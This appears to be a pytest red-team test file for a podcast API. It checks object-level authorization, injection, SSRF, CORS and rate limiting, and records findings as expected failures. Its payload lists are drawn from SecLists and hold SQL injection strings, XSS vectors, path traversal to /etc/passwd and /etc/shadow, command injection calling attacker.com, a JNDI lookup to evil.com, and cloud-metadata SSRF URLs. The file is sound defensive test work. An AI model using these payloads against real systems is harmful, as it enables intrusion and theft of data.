"""T268: Podcast LIST redteam security tests.

Red Team security tests for Podcast LIST endpoint.
Tests for BOLA, injection, SSRF in RSS URLs, and other vulnerabilities.
Uses SecLists for comprehensive fuzzing.
"""

import time

import pytest

from api.core.models.role import Role
from api.core.models.user import User
from api.podcasts.models import (
    ImportedPodcast,
    Podcast,
    PodcastEpisode,
    StationPodcast,
)
from model_bakery import baker

from sdk import now

# =============================================================================
# SecLists Payloads (sampled for performance)
# =============================================================================

SQLI_PAYLOADS = [
    # From SecLists Fuzzing/Databases/SQLi/Generic-SQLi.txt
    "' OR '1'='1",
    "'; DROP TABLE podcast--",
    "' UNION SELECT * FROM pg_authid--",
    "1' OR 1=1--",
    "') OR ('1'='1",
    "' OR sleep(5)#",
    "1) OR pg_sleep(5)--",
    "benchmark(10000000,MD5(1))#",
    "';waitfor delay '0:0:5'--",
    "||elt(-3+5,bin(15),ord(10),hex(char(45)))",
    # Boolean-based
    "' AND 1=1--",
    "' AND 1=2--",
    # Error-based
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    # Time-based
    "'; SELECT pg_sleep(5)--",
    # Stacked queries
    "'; INSERT INTO podcast VALUES (9999)--",
]

XSS_PAYLOADS = [
    # From SecLists Fuzzing/XSS/
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    # Polyglots
    "'\"><svg/onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
]

NAUGHTY_STRINGS = [
    # From SecLists Fuzzing/big-list-of-naughty-strings.txt (sampled)
    "undefined",
    "null",
    "NULL",
    "nil",
    "None",
    "true",
    "false",
    "${jndi:ldap://evil.com}",
    "__proto__",
    "constructor",
    "hasOwnProperty",
    "toString",
    "[object Object]",
    "NaN",
    "Infinity",
    "-Infinity",
    "\\",
    "\\x00",  # Null byte
    "\\x80",  # High bit
    "🎧🎤🎵",  # Emoji
    "<",
    ">",
    "&",
    '"',
    "'",
    "|",
    ";",
    "&",
    "$",
    ">",
    "<",
    "`",
    "\\",
    "../",
    "..\\",
    "/etc/passwd",
    "C:\\Windows\\System32",
]

PATH_TRAVERSAL = [
    # From SecLists Fuzzing/LFI/
    "../etc/passwd",
    "..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "..%2f..%2fetc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc/passwd",
    "....\\....\\etc\\passwd",
    "/etc/passwd%00",
    "C:\\boot.ini",
    "../../../../../../../etc/shadow",
]

COMMAND_INJECTION = [
    # Command injection payloads
    ";id",
    ";whoami",
    "|id",
    "`id`",
    "$(id)",
    ";cat /etc/passwd",
    "|/bin/ls -la",
    "&& ping -c 1 attacker.com",
    "|| nslookup attacker.com",
    "`curl attacker.com`",
]


# =============================================================================
# API1:2023 BOLA - Broken Object Level Authorization
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamBOLA:
    """API1:2023 Broken Object Level Authorization - T353 confirmation."""

    def test_bola_t353_list_shows_all_users_podcasts(
        self, api_client, admin_user, regular_user, fake_url, fake_catch_phrase,
    ):
        """
        BOLA T353: LIST returns ALL podcasts regardless of owner.

        CRITICAL: All PodcastViewSet.queryset = Podcast.objects.all()
        No owner-based filtering implemented.
        """
        # Create victim user's private podcast
        victim = baker.make(
            User, role=Role.HOST, username=f"victim_{fake_catch_phrase}",
        )
        victim_podcast = baker.make(
            Podcast,
            url=fake_url,
            title=f"Victim Private {fake_catch_phrase}",
            owner=victim,
        )

        # Admin (or any user) requests LIST
        response = api_client.get("/api/v2/podcasts")

        assert response.status_code == 200
        data = response.json()

        # Check if victim's podcast is visible
        podcast_ids = [p.get("id") for p in data]
        if victim_podcast.id in podcast_ids:
            pytest.xfail(
                "T663: BOLA - LIST shows other users' private podcasts",
            )

    def test_bola_t353_regular_user_sees_all_podcasts(
        self, api_client, regular_user, fake_url, fake_catch_phrase,
    ):
        """
        BOLA T353: Regular user can see all podcasts including admin's.
        """
        # Create admin's private podcast
        admin = baker.make(
            User, role=Role.ADMIN, username=f"admin_{fake_catch_phrase}",
        )
        admin_podcast = baker.make(
            Podcast,
            url=fake_url,
            title=f"Admin Private {fake_catch_phrase}",
            owner=admin,
        )

        # Regular user requests LIST
        api_client.force_authenticate(user=regular_user)
        response = api_client.get("/api/v2/podcasts")

        assert response.status_code == 200
        data = response.json()

        podcast_ids = [p.get("id") for p in data]
        if admin_podcast.id in podcast_ids:
            pytest.xfail(
                "T663: BOLA - Regular user sees admin's private podcasts",
            )

    def test_bola_t353_guest_user_can_list_podcasts(
        self, api_client, guest_user, fake_url, fake_catch_phrase,
    ):
        """
        BFLA T353: Guest user can access podcast LIST.
        """
        baker.make(Podcast, url=fake_url, title=fake_catch_phrase)

        api_client.force_authenticate(user=guest_user)
        response = api_client.get("/api/v2/podcasts")

        if response.status_code == 200:
            pytest.xfail("T664: BFLA - Guest user can list podcasts")

    def test_bola_id_format_manipulation_numeric(
        self, api_client, admin_user, fake_url, fake_catch_phrase,
    ):
        """
        BOLA: Test ID format confusion - numeric vs string IDs.
        """
        podcast = baker.make(Podcast, url=fake_url, title=fake_catch_phrase)

        # Try different ID formats
        id_formats = [
            str(podcast.id),
            f"{podcast.id}.0",
            f"{podcast.id} ",
            f"{podcast.id}\\x00",
        ]

        for id_fmt in id_formats:
            response = api_client.get(f"/api/v2/podcasts/{id_fmt}")
            # If any format works unexpectedly, document it
            if response.status_code == 200 and id_fmt != str(podcast.id):
                pytest.xfail(f"T665: ID format confusion works: {id_fmt}")

    def test_bola_negative_id_access(self, api_client, admin_user):
        """
        BOLA: Negative ID may bypass access controls.
        """
        response = api_client.get("/api/v2/podcasts/-1")
        # Should be 404, but if 500 or other error, it's info leak
        if response.status_code == 500:
            pytest.xfail("T666: Negative ID causes 500 error")

    def test_bola_zero_id_access(self, api_client, admin_user):
        """
        BOLA: ID=0 may have special meaning or bypass.
        """
        response = api_client.get("/api/v2/podcasts/0")
        if response.status_code == 200:
            pytest.xfail("T667: ID=0 returns data (potential bypass)")


# =============================================================================
# API8:2023 Injection Attacks (SQLi, NoSQLi, Command Injection)
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamInjection:
    """Injection attacks on LIST endpoint using SecLists payloads."""

    def test_sqli_in_search_param(
        self, api_client, admin_user, fake_catch_phrase,
    ):
        """
        SQL Injection via search parameter - SecLists comprehensive.
        """
        for payload in SQLI_PAYLOADS[:10]:  # Sample for performance
            response = api_client.get(f"/api/v2/podcasts?search={payload}")

            if response.status_code == 500:
                pytest.xfail(
                    f"T668: SQLi in search causes 500: {payload[:30]}",
                )

            error_text = str(response.content).lower()
            sql_errors = [
                "sql",
                "syntax",
                "pg_query",
                "column",
                "table",
                "error",
            ]
            if any(err in error_text for err in sql_errors):
                pytest.xfail(f"T668: SQLi error disclosure: {payload[:30]}")

    def test_sqli_in_title_filter(self, api_client, admin_user):
        """
        SQL Injection via title filter - comprehensive payloads.
        """
        for payload in SQLI_PAYLOADS[:8]:
            response = api_client.get(f"/api/v2/podcasts?title={payload}")

            if response.status_code == 500:
                pytest.xfail(f"T669: SQLi in title causes 500: {payload[:30]}")

            if (
                "podcast" in str(response.content).lower()
                and response.status_code != 200
            ):
                pytest.xfail("T669: Potential SQLi info leak in title filter")

    def test_sqli_in_ordering_param(self, api_client, admin_user):
        """
        SQL Injection via ordering parameter - time-based detection.
        """
        for payload in [
            "title; SELECT pg_sleep(2)--",
            "title,(SELECT pg_sleep(2))",
            "(SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END)",
        ]:
            start = time.time()
            response = api_client.get(f"/api/v2/podcasts?ordering={payload}")
            duration = time.time() - start

            if duration > 1.5:  # Time-based SQLi detected
                pytest.xfail(
                    f"T670: Time-based SQLi in ordering: {duration:.2f}s",
                )

            if response.status_code == 500:
                pytest.xfail("T670: SQLi in ordering causes 500")

    def test_sqli_union_based_injection(self, api_client, admin_user):
        """
        SQLi UNION-based injection in filters.
        """
        union_payloads = [
            "' UNION SELECT null,null,null,null,null,null--",
            "' UNION SELECT username,password,null,null,null,null FROM auth_user--",
            "' UNION SELECT version(),null,null,null,null,null--",
        ]

        for payload in union_payloads:
            response = api_client.get(f"/api/v2/podcasts?search={payload}")
            if "username" in str(response.content) or "password" in str(
                response.content,
            ):
                pytest.xfail("T671: UNION-based SQLi successful")

    def test_nosql_injection_mongodb_operators(self, api_client, admin_user):
        """
        NoSQL injection attempts via JSON-like operators.
        """
        nosql_payloads = [
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$gt": ""}',
            '{"$exists": true}',
        ]

        for payload in nosql_payloads:
            response = api_client.get(f"/api/v2/podcasts?title={payload}")
            # If it doesn't error, might be vulnerable
            if response.status_code == 200 and len(response.json()) > 0:
                # Check if filter was bypassed
                pass

    def test_command_injection_via_url_param(self, api_client, admin_user):
        """
        Command injection in URL parameter (potential SSRF/RCE vector).
        """
        for payload in COMMAND_INJECTION[:5]:
            response = api_client.get(f"/api/v2/podcasts?url={payload}")
            if response.status_code == 500:
                error_text = str(response.content).lower()
                if any(
                    cmd in error_text for cmd in ["uid=", "root:", "command"]
                ):
                    pytest.xfail("T672: Command injection in URL parameter")


# =============================================================================
# API8:2023 Information Disclosure
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamInformationDisclosure:
    """Information disclosure tests."""

    def test_list_includes_owner_id(
        self, api_client, admin_user, regular_user, fake_url, fake_catch_phrase,
    ):
        """
        Information disclosure: LIST includes owner_id field.

        Can be used to enumerate user IDs.
        """
        victim = baker.make(
            User, role=Role.HOST, username=f"victim_{fake_catch_phrase}",
        )
        baker.make(
            Podcast, url=fake_url, title=fake_catch_phrase, owner=victim,
        )

        response = api_client.get("/api/v2/podcasts")

        assert response.status_code == 200
        data = response.json()

        if data:
            if "owner" in data[0]:
                owner_id = data[0].get("owner")
                if owner_id:
                    pytest.xfail(
                        "T673: Owner ID exposed in LIST (user enumeration)",
                    )

    def test_error_message_leaks_db_structure(self, api_client, admin_user):
        """
        Error messages should not leak database structure.
        """
        response = api_client.get("/api/v2/podcasts?ordering=invalid')")

        if response.status_code == 500:
            error_text = str(response.content).lower()
            leak_keywords = [
                "podcast",
                "pg_query",
                "column",
                "table",
                "cc_podcast",
                "syntax",
            ]
            if any(kw in error_text for kw in leak_keywords):
                pytest.xfail("T674: Error message leaks database structure")

    def test_id_enumeration_via_404_403(
        self, api_client, regular_user, fake_url, fake_catch_phrase,
    ):
        """
        Different errors for existent vs non-existent IDs leak existence.
        """
        admin = baker.make(
            User, role=Role.ADMIN, username=f"admin_{fake_catch_phrase}",
        )
        admin_podcast = baker.make(
            Podcast,
            url=fake_url,
            title=fake_catch_phrase,
            owner=admin,
        )

        api_client.force_authenticate(user=regular_user)

        response_existing = api_client.get(
            f"/api/v2/podcasts/{admin_podcast.id}",
        )
        response_nonexistent = api_client.get("/api/v2/podcasts/999999")

        # If different status codes, ID enumeration is possible
        if response_existing.status_code != response_nonexistent.status_code:
            if response_existing.status_code == 200:
                pytest.xfail("T675: BOLA confirmed - existing returns 200")

    def test_verbose_error_on_invalid_json(self, api_client, admin_user):
        """
        Invalid JSON body may trigger verbose error.
        """
        response = api_client.post(
            "/api/v2/podcasts",
            data="invalid json {",
            content_type="application/json",
        )
        if response.status_code == 500:
            error_text = str(response.content).lower()
            if "traceback" in error_text or "django" in error_text:
                pytest.xfail("T676: Verbose error on invalid JSON")

    def test_stack_trace_in_debug_mode(self, api_client, admin_user):
        """
        Check if debug mode exposes stack traces.
        """
        response = api_client.get("/api/v2/podcasts?search=\\x00")
        if response.status_code == 500:
            if (
                b"Traceback" in response.content
                or b'File "' in response.content
            ):
                pytest.xfail("T677: Stack trace exposed in error response")


# =============================================================================
# API4:2023 Unrestricted Resource Consumption
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamResourceConsumption:
    """API4:2023 Unrestricted Resource Consumption."""

    def test_rapid_list_requests(self, api_client, admin_user):
        """
        Rate limiting: Rapid LIST requests (50 in 1 second).
        """
        success_count = 0
        for _ in range(50):
            response = api_client.get("/api/v2/podcasts")
            if response.status_code == 200:
                success_count += 1

        if success_count == 50:
            pytest.xfail(
                "T678: No rate limiting on Podcast LIST (50 req/s allowed)",
            )

    def test_bulk_podcast_list(
        self, api_client, admin_user, fake_url, fake_catch_phrase,
    ):
        """
        Resource consumption: List without pagination (1000 records).
        """
        # Create many podcasts
        for i in range(100):
            baker.make(
                Podcast,
                url=fake_url,
                title=f"Podcast {i} {fake_catch_phrase}",
            )

        response = api_client.get("/api/v2/podcasts")

        if response.status_code == 200:
            data = response.json()
            if isinstance(data, list) and len(data) >= 100:
                pytest.xfail(
                    "T679: Large result set without pagination (100+ records)",
                )

    def test_large_page_size_abuse(self, api_client, admin_user):
        """
        Pagination: Large page_size can exhaust resources.
        """
        response = api_client.get("/api/v2/podcasts?page_size=10000")

        if response.status_code == 200:
            data = response.json()
            if isinstance(data, list) and len(data) > 1000:
                pytest.xfail("T680: No max_page_size limit (10K returned)")

    def test_repeated_identical_requests(self, api_client, admin_user):
        """
        Cache-based DoS via repeated identical requests.
        """
        for _ in range(100):
            response = api_client.get("/api/v2/podcasts")
            if response.status_code != 200:
                break
        else:
            # All 100 succeeded without throttling
            pass

    def test_deeply_nested_filter_params(self, api_client, admin_user):
        """
        Deeply nested filter parameters may cause CPU exhaustion.
        """
        # Create deeply nested query string
        nested = "&".join(
            [
                f"filter[{i}][field]=title&filter[{i}][op]=eq&filter[{i}][val]=test"
                for i in range(50)
            ],
        )
        response = api_client.get(f"/api/v2/podcasts?{nested}")

        if response.status_code == 500:
            pytest.xfail("T681: Deeply nested params cause 500")


# =============================================================================
# API2:2023 Broken Authentication
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamAuthentication:
    """Authentication tests."""

    def test_unauthenticated_list(self, api_client):
        """Unauthenticated LIST should fail."""
        api_client.logout()
        response = api_client.get("/api/v2/podcasts")
        assert response.status_code == 403

    def test_unauthenticated_retrieve(
        self, api_client, fake_url, fake_catch_phrase,
    ):
        """Unauthenticated RETRIEVE should fail."""
        podcast = baker.make(Podcast, url=fake_url, title=fake_catch_phrase)

        api_client.logout()
        response = api_client.get(f"/api/v2/podcasts/{podcast.id}")
        assert response.status_code == 403

    def test_invalid_token_format(self, api_client):
        """Invalid token format should fail."""
        api_client.logout()
        api_client.credentials(HTTP_AUTHORIZATION="Bearer invalid_token_12345")
        response = api_client.get("/api/v2/podcasts")
        assert response.status_code == 403

    def test_malformed_auth_header(self, api_client):
        """Malformed Authorization header."""
        api_client.logout()
        api_client.credentials(HTTP_AUTHORIZATION="InvalidFormat token")
        response = api_client.get("/api/v2/podcasts")
        assert response.status_code == 403

    def test_empty_auth_header(self, api_client):
        """Empty Authorization header."""
        api_client.logout()
        api_client.credentials(HTTP_AUTHORIZATION="")
        response = api_client.get("/api/v2/podcasts")
        assert response.status_code == 403


# =============================================================================
# PodcastEpisode BOLA Tests
# =============================================================================


@pytest.mark.django_db
class TestPodcastEpisodeListRedTeamBOLA:
    """BOLA tests for PodcastEpisode LIST."""

    def test_bola_episode_list_shows_all_episodes(
        self, api_client, admin_user, regular_user, fake_url, fake_catch_phrase,
    ):
        """
        BOLA: PodcastEpisode LIST returns all episodes regardless of podcast owner.
        """
        victim = baker.make(
            User, role=Role.HOST, username=f"victim_{fake_catch_phrase}",
        )
        victim_podcast = baker.make(
            Podcast,
            url=fake_url,
            title=f"Victim Private {fake_catch_phrase}",
            owner=victim,
        )
        victim_episode = baker.make(
            PodcastEpisode,
            podcast=victim_podcast,
            episode_title="Victim Private Episode",
            download_url=fake_url,
            published_at=now(),
        )

        api_client.force_authenticate(user=regular_user)
        response = api_client.get("/api/v2/podcast-episodes")

        assert response.status_code == 200
        data = response.json()

        episode_ids = [e.get("id") for e in data]
        if victim_episode.id in episode_ids:
            pytest.xfail(
                "T682: BOLA - Episode LIST shows other users' private episodes",
            )


# =============================================================================
# StationPodcast BOLA Tests
# =============================================================================


@pytest.mark.django_db
class TestPodcastStationListRedTeamBOLA:
    """BOLA tests for StationPodcast LIST."""

    def test_bola_station_podcast_list_shows_all(
        self, api_client, admin_user, regular_user, fake_url, fake_catch_phrase,
    ):
        """
        BOLA: StationPodcast LIST returns all regardless of owner.
        """
        victim = baker.make(
            User, role=Role.HOST, username=f"victim_{fake_catch_phrase}",
        )
        victim_podcast = baker.make(
            Podcast, url=fake_url, title=fake_catch_phrase, owner=victim,
        )
        station_podcast = baker.make(StationPodcast, podcast=victim_podcast)

        api_client.force_authenticate(user=regular_user)
        response = api_client.get("/api/v2/station-podcasts")

        if response.status_code == 403:
            pytest.skip("StationPodcast requires special permissions")

        assert response.status_code == 200
        data = response.json()

        station_ids = [s.get("id") for s in data]
        if station_podcast.id in station_ids:
            pytest.xfail(
                "T683: BOLA - StationPodcast LIST shows other users' entries",
            )


# =============================================================================
# ImportedPodcast BOLA Tests
# =============================================================================


@pytest.mark.django_db
class TestImportedPodcastListRedTeamBOLA:
    """BOLA tests for ImportedPodcast LIST."""

    def test_bola_imported_podcast_list_shows_all(
        self, api_client, admin_user, regular_user, fake_url, fake_catch_phrase,
    ):
        """
        BOLA: ImportedPodcast LIST returns all regardless of owner.
        """
        victim = baker.make(
            User, role=Role.HOST, username=f"victim_{fake_catch_phrase}",
        )
        victim_podcast = baker.make(
            Podcast, url=fake_url, title=fake_catch_phrase, owner=victim,
        )
        imported = baker.make(
            ImportedPodcast, podcast=victim_podcast, override_album=False,
        )

        api_client.force_authenticate(user=regular_user)
        response = api_client.get("/api/v2/imported-podcasts")

        if response.status_code == 403:
            pytest.skip("ImportedPodcast requires special permissions")

        assert response.status_code == 200
        data = response.json()

        imported_ids = [i.get("id") for i in data]
        if imported.id in imported_ids:
            pytest.xfail(
                "T684: BOLA - ImportedPodcast LIST shows other users' entries",
            )


# =============================================================================
# API5:2023 BFLA - HTTP Method Tampering
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamHTTPMethodTampering:
    """HTTP method tampering tests."""

    def test_trace_method_disabled(
        self, api_client, admin_user, fake_url, fake_catch_phrase,
    ):
        """TRACE method should be disabled."""
        podcast = baker.make(Podcast, url=fake_url, title=fake_catch_phrase)

        response = api_client.trace(f"/api/v2/podcasts/{podcast.id}")
        assert response.status_code in [405, 403]

    def test_method_override_via_header(
        self, api_client, admin_user, fake_url, fake_catch_phrase,
    ):
        """
        Method override via X-HTTP-Method-Override header.
        """
        podcast = baker.make(Podcast, url=fake_url, title=fake_catch_phrase)

        # Try to GET via POST with override
        response = api_client.post(
            f"/api/v2/podcasts/{podcast.id}",
            {},
            HTTP_X_HTTP_METHOD_OVERRIDE="GET",
        )
        # Should not work
        if response.status_code == 200 and "title" in str(response.content):
            pytest.xfail("T685: Method override header bypass works")

    def test_method_override_via_query_param(
        self, api_client, admin_user, fake_url, fake_catch_phrase,
    ):
        """
        Method override via _method query parameter.
        """
        podcast = baker.make(Podcast, url=fake_url, title=fake_catch_phrase)

        response = api_client.post(
            f"/api/v2/podcasts/{podcast.id}?_method=DELETE", {},
        )
        if response.status_code == 204:
            pytest.xfail("T686: Method override via query param works")


# =============================================================================
# API3:2023 BOPLA - Mass Assignment & Property Manipulation
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamBOPLA:
    """Broken Object Property Level Authorization tests."""

    def test_mass_assignment_via_list_endpoint(
        self, api_client, admin_user, fake_url, fake_catch_phrase,
    ):
        """
        Try to modify read-only fields via LIST (if PATCH on list is supported).
        """
        # Some DRF setups allow bulk update via list endpoint
        response = api_client.patch(
            "/api/v2/podcasts",
            [{"id": 1, "owner_id": 999}],  # Try to change owner
            format="json",
        )
        # Should not be allowed
        if response.status_code == 200:
            pytest.xfail("T687: Mass assignment via list endpoint works")

    def test_field_selection_via_query_param(
        self, api_client, admin_user, fake_url, fake_catch_phrase,
    ):
        """
        Try to select specific fields via query param (may bypass field-level auth).
        """
        # Some APIs support ?fields= to limit returned fields
        response = api_client.get(
            "/api/v2/podcasts?fields=owner,password,secret",
        )
        if response.status_code == 200:
            data = response.json()
            if data and "password" in str(data):
                pytest.xfail("T688: Field selection reveals sensitive data")


# =============================================================================
# API8:2023 Security Misconfiguration - Fuzzing Tests
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamFuzzing:
    """Fuzzing tests using SecLists payloads."""

    def test_naughty_strings_in_search(self, api_client, admin_user):
        """
        Fuzz search parameter with naughty strings.
        """
        for payload in NAUGHTY_STRINGS[:10]:
            response = api_client.get(f"/api/v2/podcasts?search={payload}")
            # Should handle gracefully (200 or 400), not 500
            if response.status_code == 500:
                pytest.xfail(
                    f"T689: Naughty string causes 500: {payload[:30]}",
                )

    def test_naughty_strings_in_title_filter(self, api_client, admin_user):
        """
        Fuzz title filter with naughty strings.
        """
        for payload in NAUGHTY_STRINGS[:8]:
            response = api_client.get(f"/api/v2/podcasts?title={payload}")
            if response.status_code == 500:
                pytest.xfail("T690: Naughty string in title causes 500")

    def test_xss_payloads_in_filters(self, api_client, admin_user):
        """
        XSS payloads in filter parameters (stored XSS test).
        """
        for payload in XSS_PAYLOADS[:5]:
            response = api_client.get(f"/api/v2/podcasts?search={payload}")
            # If payload is reflected without sanitization, it's XSS
            if payload in str(response.content):
                pytest.xfail(f"T691: XSS payload reflected: {payload[:30]}")

    def test_path_traversal_in_params(self, api_client, admin_user):
        """
        Path traversal in query parameters.
        """
        for payload in PATH_TRAVERSAL[:5]:
            response = api_client.get(f"/api/v2/podcasts?file={payload}")
            if "root:" in str(response.content) or "passwd" in str(
                response.content,
            ):
                pytest.xfail(f"T692: Path traversal works: {payload}")

    def test_unicode_normalization_attacks(self, api_client, admin_user):
        """
        Unicode normalization attacks (homograph, etc.).
        """
        unicode_attacks = [
            "ｓｅｌｅｃｔ",  # Full-width characters
            "ѕеlect",  # Cyrillic homographs
            "test\u0000",  # Null byte
            "test\uffff",  # High Unicode
        ]
        for payload in unicode_attacks:
            response = api_client.get(f"/api/v2/podcasts?search={payload}")
            if response.status_code == 500:
                pytest.xfail("T693: Unicode attack causes 500")


# =============================================================================
# API7:2023 SSRF - Server Side Request Forgery
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamSSRF:
    """SSRF tests for LIST endpoint (if URL parameters are fetched)."""

    def test_ssrf_via_url_param_internal(self, api_client, admin_user):
        """
        SSRF: Try to fetch internal URLs via url parameter.
        """
        internal_urls = [
            "http://localhost/",
            "http://127.0.0.1/",
            "http://[::1]/",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://internal-service/",
            "file:///etc/passwd",
        ]

        for url in internal_urls:
            response = api_client.get(f"/api/v2/podcasts?url={url}")
            # If internal content appears, SSRF exists
            content = str(response.content).lower()
            if any(
                indicator in content
                for indicator in ["root:", "localhost", "meta-data"]
            ):
                pytest.xfail(f"T694: SSRF to {url} successful")

    def test_ssrf_dns_rebinding(self, api_client, admin_user):
        """
        SSRF via DNS rebinding.
        """
        rebinding_domains = [
            "http://127.0.0.1.xip.io/",
            "http://7f000001.nip.io/",
        ]
        for domain in rebinding_domains:
            response = api_client.get(f"/api/v2/podcasts?url={domain}")
            if response.status_code == 200 and "json" in str(response.content):
                pytest.xfail("T695: SSRF via DNS rebinding possible")


# =============================================================================
# Header Injection & CORS Tests
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamHeaders:
    """Header injection and CORS tests."""

    def test_cors_preflight_arbitrary_origin(self, api_client, admin_user):
        """
        CORS: Check if arbitrary origins are allowed.
        """
        response = api_client.options(
            "/api/v2/podcasts",
            HTTP_ORIGIN="https://evil.com",
            HTTP_ACCESS_CONTROL_REQUEST_METHOD="GET",
        )

        allow_origin = response.get("Access-Control-Allow-Origin")
        if allow_origin == "*" or allow_origin == "https://evil.com":
            pytest.xfail("T696: CORS allows arbitrary origin")

    def test_host_header_poisoning(self, api_client, admin_user):
        """
        Host header poisoning test.
        """
        response = api_client.get(
            "/api/v2/podcasts",
            HTTP_HOST="evil.com",
            HTTP_X_FORWARDED_HOST="evil.com",
        )
        # If response reflects poisoned host, it might be vulnerable
        if "evil.com" in str(response.content):
            pytest.xfail("T697: Host header poisoning possible")

    def test_cache_poisoning_via_headers(self, api_client, admin_user):
        """
        Cache poisoning via X-Forwarded-Host header.
        """
        # First request with poisoned header
        response1 = api_client.get(
            "/api/v2/podcasts", HTTP_X_FORWARDED_HOST="evil.com",
        )
        # Normal request
        response2 = api_client.get("/api/v2/podcasts")

        if "evil.com" in str(response2.content):
            pytest.xfail("T698: Cache poisoning via X-Forwarded-Host")


# =============================================================================
# Business Logic Tests
# =============================================================================


@pytest.mark.django_db
class TestPodcastListRedTeamBusinessLogic:
    """Business logic abuse tests."""

    def test_filter_bypass_via_encoding(self, api_client, admin_user):
        """
        Try to bypass filters via encoding.
        """
        encodings = [
            ("title", "test%00"),  # Null byte
            ("title", "test%0d%0a"),  # CRLF
            ("title", "test%20"),  # URL-encoded space
            ("title", "test\t"),  # Tab
        ]

        for field, value in encodings:
            response = api_client.get(f"/api/v2/podcasts?{field}={value}")
            if response.status_code == 500:
                pytest.xfail("T699: Encoding bypass causes 500")

    def test_jsonp_callback_injection(self, api_client, admin_user):
        """
        JSONP callback parameter injection.
        """
        malicious_callbacks = [
            "alert(1)",
            "<script>alert(1)</script>",
            "function(){alert(1)}",
        ]

        for callback in malicious_callbacks:
            response = api_client.get(f"/api/v2/podcasts?callback={callback}")
            if callback in str(response.content):
                pytest.xfail("T700: JSONP callback injection possible")
